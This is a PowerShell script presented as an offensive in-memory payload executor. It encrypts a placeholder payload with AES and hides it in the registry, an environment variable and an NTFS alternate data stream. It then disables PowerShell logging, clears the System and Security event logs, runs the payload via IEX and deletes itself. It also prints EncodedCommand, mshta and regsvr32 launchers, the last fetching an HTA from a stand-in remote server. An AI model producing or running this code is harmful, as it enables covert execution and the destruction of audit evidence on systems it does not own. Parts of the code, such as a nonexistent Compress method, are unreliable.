<#
.SYNOPSIS
  Full AES-based in-memory payload executor with anti-forensics & LOLBin-compatible output

.DESCRIPTION
  1. Encrypts inline payload using AES-CBC
  2. Stores it in Registry, Env, and ADS fallback
  3. Wipes PowerShell, log, event traces
  4. Provides mshta, regsvr32, and EncodedCommand launchers
  5. Executes payload entirely in-memory

.VERSION
  Final | Military-Grade
#>

# ------------------ CONFIG ------------------
$AESKey = [Text.Encoding]::UTF8.GetBytes("MySecretKey12345")   # 16 bytes key
$AESIV  = [byte[]](1..16)                                      # Static IV for demo

$PayloadCode = @'
Write-Output "[+] Payload executed on $env:COMPUTERNAME at $(Get-Date)"
'@

$RegistryPath = "HKCU:\Software\REDoT"
$EnvVarName   = "REDoT_PAYLOAD"
$ADSPath      = "C:\Windows\System32:notepad.exe:payload.ads"

# ------------------ AES Encrypt/Decrypt ------------------
Function Encrypt-AES($plain, $key, $iv) {
    $bytes = [Text.Encoding]::UTF8.GetBytes($plain)
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode = "CBC"; $aes.Padding = "PKCS7"
    $aes.Key = $key; $aes.IV = $iv
    $enc = $aes.CreateEncryptor().TransformFinalBlock($bytes, 0, $bytes.Length)
    [Convert]::ToBase64String($enc)
}

Function Decrypt-AES($enc, $key, $iv) {
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode = 'CBC'; $aes.Padding = 'PKCS7'
    $aes.Key = $key; $aes.IV = $iv
    $encBytes = [Convert]::FromBase64String($enc)
    $plain = $aes.CreateDecryptor().TransformFinalBlock($encBytes, 0, $encBytes.Length)
    [Text.Encoding]::UTF8.GetString($plain)
}

# ------------------ Cleanup ------------------
Function Clear-Forensics {
    try { Clear-History } catch {}
    $h = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path $h) { Remove-Item $h -Force }
    Remove-Module PSReadLine -ErrorAction SilentlyContinue
    Stop-Transcript -ErrorAction SilentlyContinue

    try {
        New-Item "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force | Out-Null
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" `
            -Name EnableScriptBlockLogging -Value 0
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" `
            -Name EnableScriptBlockInvocationLogging -Value 0
    } catch {}

    try {
        Remove-Item "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Recurse -Force
    } catch {}

    try {
        "System","Security","Microsoft-Windows-PowerShell/Operational" |
            ForEach-Object { wevtutil cl $_ 2>$null }
    } catch {}
}

# ------------------ Store AES Payload ------------------
$EncryptedPayload = Encrypt-AES -plain $PayloadCode -key $AESKey -iv $AESIV

Set-ItemProperty -Path $RegistryPath -Name enc -Value $EncryptedPayload -Force
[Environment]::SetEnvironmentVariable($EnvVarName, $EncryptedPayload, "User")
Set-Content -Path $ADSPath -Value $EncryptedPayload -Force

# ------------------ Loaders ------------------
Function Retrieve-AESPayload {
    $sources = @(
        { (Get-ItemProperty -Path $RegistryPath -Name "enc").enc },
        { [Environment]::GetEnvironmentVariable($EnvVarName, "User") },
        { Get-Content -Path $ADSPath -Raw }
    )
    foreach ($s in $sources) {
        try {
            $val = & $s
            if ($val.Length -gt 20) { return $val }
        } catch {}
    }
    return ""
}

Function Execute-InMemory {
    param($code)
    try { IEX $code } catch { Write-Warning $_ }
}

Function Self-Delete {
    $me = $MyInvocation.MyCommand.Definition
    Start-Sleep -Milliseconds 400
    cmd /c "del `"$me`" >nul 2>&1"
}

# ------------------ Payload Execution ------------------
Clear-Forensics

$encPayload = Retrieve-AESPayload
if ($encPayload) {
    $dec = Decrypt-AES -enc $encPayload -key $AESKey -iv $AESIV
    Execute-InMemory $dec
}

Self-Delete
[GC]::Collect()

# ------------------ STAGER STRINGS ------------------

# EncodedCommand variant
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(
"Invoke-Expression (New-Object IO.StreamReader ([IO.Compression.DeflateStream]::new([IO.MemoryStream]::new([Convert]::FromBase64String(`"$([Convert]::ToBase64String([IO.Compression.DeflateStream]::Compress([Text.Encoding]::UTF8.GetBytes(`"$dec`"))))`")), [IO.Compression.CompressionMode]::Decompress))).ReadToEnd()"
))

Write-Host "`n EncodedCommand Launcher:"
Write-Host "powershell.exe -EncodedCommand $encoded`n"

# mshta
$hta = "mshta javascript:eval('new ActiveXObject(\"WScript.Shell\").Run(\"powershell -EncodedCommand $encoded\")')"
Write-Host " mshta Launcher:"
Write-Host $hta

# regsvr32
Write-Host "`n regsvr32 Launcher (host HTA on remote server):"
Write-Host "regsvr32 /u /n /s /i:http://yourserver.com/drop.hta scrobj.dll"
